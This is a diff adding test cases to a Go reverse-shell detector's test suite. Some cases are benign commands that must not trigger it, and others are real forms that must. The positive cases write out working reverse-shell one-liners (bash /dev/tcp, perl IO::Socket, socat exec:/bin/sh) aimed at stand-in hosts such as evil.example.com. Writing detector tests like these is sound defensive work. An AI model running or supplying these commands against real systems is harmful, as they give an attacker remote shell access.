@@ -109,6 +109,29 @@ func TestDetectReverseShells(t *testing.T) {
 		// socat SYSTEM: is EXEC:'s twin; with a dotless host, decimal or IPv6
 		// address there is no network indicator, so it must be self-sufficient
 		// on a socat command line.
+		// Benign agent commands that used to auto-kill the container (CRITICAL).
+		{name: "rg for socat exec: in source", processes: []Process{{PID: 1, User: "1000", Command: `rg -n "exec:" internal/`}}, wantCount: 0},
+		{name: "bash wrapper running rg exec:", processes: []Process{{PID: 1, User: "1000", Command: `/bin/bash -c source /tmp/snap.sh && rg -n "EXEC:" internal/monitor`}}, wantCount: 0},
+		{name: "grep for /dev/tcp/ in docs", processes: []Process{{PID: 1, User: "1000", Command: `grep -rn /dev/tcp/ docs`}}, wantCount: 0},
+		{name: "loopback port probe via /dev/tcp", processes: []Process{{PID: 1, User: "1000", Command: `bash -c </dev/tcp/localhost/5432`}}, wantCount: 0},
+		{name: "loopback /dev/tcp write probe", processes: []Process{{PID: 1, User: "1000", Command: `timeout 1 bash -c cat < /dev/null > /dev/tcp/127.0.0.1/8080`}}, wantCount: 0},
+		{name: "perl -MIO::File", processes: []Process{{PID: 1, User: "1000", Command: `perl -MIO::File -e 'print 1'`}}, wantCount: 0},
+		{name: "script named *.sh run with -i", processes: []Process{{PID: 1, User: "1000", Command: `./scripts/setup.sh -i`}}, wantCount: 0},
+		{name: "hyphenated binary ending in -sh -i", processes: []Process{{PID: 1, User: "1000", Command: `/usr/local/bin/kube-sh -i`}}, wantCount: 0},
+		{name: "python -c health-checking local dev server", processes: []Process{{PID: 1, User: "1000", Command: `python3 -c 'import urllib.request; print(urllib.request.urlopen("http://127.0.0.1:8000/health").status)'`}}, wantCount: 0},
+		{name: "python -c touching docker.sock path", processes: []Process{{PID: 1, User: "1000", Command: `python3 -c 'import os; print(os.path.exists("/var/run/docker.sock"))'`}}, wantCount: 0},
+		{name: "python -c reading SSH_AUTH_SOCK", processes: []Process{{PID: 1, User: "1000", Command: `python3 -c 'import os; print(os.environ.get("SSH_AUTH_SOCK"))'`}}, wantCount: 0},
+		{name: "python -c printing a file:line", processes: []Process{{PID: 1, User: "1000", Command: `python3 -c 'print("error at app.py:12")'`}}, wantCount: 0},
+
+		// ...while the real forms of those patterns still fire.
+		{name: "bash exec fd to remote /dev/tcp", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 5<>/dev/tcp/evil.example.com/443; cat <&5 | sh >&5`}}, wantCount: 1},
+		{name: "udp redirect reverse shell", processes: []Process{{PID: 1, User: "1000", Command: `zsh -c 'zmodload x; cat >& /dev/udp/10.0.0.1/53 0>&1'`}}, wantCount: 1},
+		{name: "perl -MIO reverse shell", processes: []Process{{PID: 1, User: "1000", Command: `perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4444");STDIN->fdopen($c,r);'`}}, wantCount: 1},
+		{name: "perl -MIO::Socket::INET", processes: []Process{{PID: 1, User: "1000", Command: `perl -MIO::Socket::INET -e 'print 1'`}}, wantCount: 1},
+		{name: "python -c to remote host:port stays a one-liner match", processes: []Process{{PID: 1, User: "1000", Command: `python3 -c 'import urllib.request; urllib.request.urlopen("http://evil.example.com:8080/x")'`}}, wantCount: 1},
+		{name: "socat EXEC: still fires", processes: []Process{{PID: 1, User: "1000", Command: `/usr/bin/socat tcp-connect:attacker:443 exec:/bin/sh,pty`}}, wantCount: 1},
+		{name: "path-qualified sh -i still fires", processes: []Process{{PID: 1, User: "1000", Command: `/bin/sh -i`}}, wantCount: 1},
+
 		{
 			name:      "socat SYSTEM: with dotless hostname",
 			processes: []Process{{PID: 1234, User: "1000", Command: `socat OPENSSL:attacker:443 SYSTEM:sh`}},
